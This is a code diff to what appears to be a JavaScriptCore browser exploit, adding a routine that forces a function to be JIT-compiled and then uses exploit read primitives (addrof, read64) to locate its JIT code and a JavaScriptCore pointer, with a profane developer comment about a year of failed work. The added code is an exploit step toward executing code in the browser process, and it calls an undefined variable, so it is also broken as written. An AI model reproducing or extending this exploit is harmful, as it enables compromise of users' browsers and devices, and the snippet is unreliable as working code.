@@ -659,8 +659,102 @@ var VM_PROT_EXECUTE = 0x4
         var hdr = Sub(anchor, anchor.lo() & 0xfff);
         log('Webcore header @' + hdr); //dyld_cache_header
         */ //this wont be viable in our context as we can't access DOM Objects from a webworker dialect RIP.
-              let stream = new ReadableStream();
-        log(stream)
+        function makeJITCompiledFunction() {
+    var obj = {};
+    // Some code to avoid inlining...
+    function target(num) {
+      num ^= Math.random() * 10000;
+      num ^= 0x70000001;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000002;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000003;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000004;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000005;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000006;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000007;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000008;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000009;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000000a;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000000b;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000000c;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000000d;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000000e;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000000f;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000010;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000011;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000012;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000013;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000014;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000015;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000016;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000017;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000018;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000019;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000001a;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000001b;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000001c;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000001d;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000001e;
+      num ^= Math.random() * 10000;
+      num ^= 0x7000001f;
+      num ^= Math.random() * 10000;
+      num ^= 0x70000020;
+      num ^= Math.random() * 10000;
+      num &= 0xffff;
+      return num;
+    }
+
+    // Force JIT compilation.
+    for (var i = 0; i < 1000; i++) {
+      target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+      target(i);
+    }
+    for (var i = 0; i < 1000; i++) {
+      target(i);
+    }
+    return target;
+  }
+    var funcAddr = memory.addrof(func);
+    print("[+] JIT function @ " + funcAddr.toString());
+    var executableAddr = memory.read64(Add(funcAddr, 3 * 8));
+    print("[+] Executable instance @ " + executableAddr.toString());
+
+    var jitCodeAddr = memory.read64(Add(executableAddr, 3 * 8));
+    print("[+] JITCode instance @ " + jitCodeAddr.toString());
+    var anchor = memory.read64(jitCodeAddr);
+    print("JavaScriptCore instance @" + anchor);
+              
+
         /*while(true)
         {
         FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...
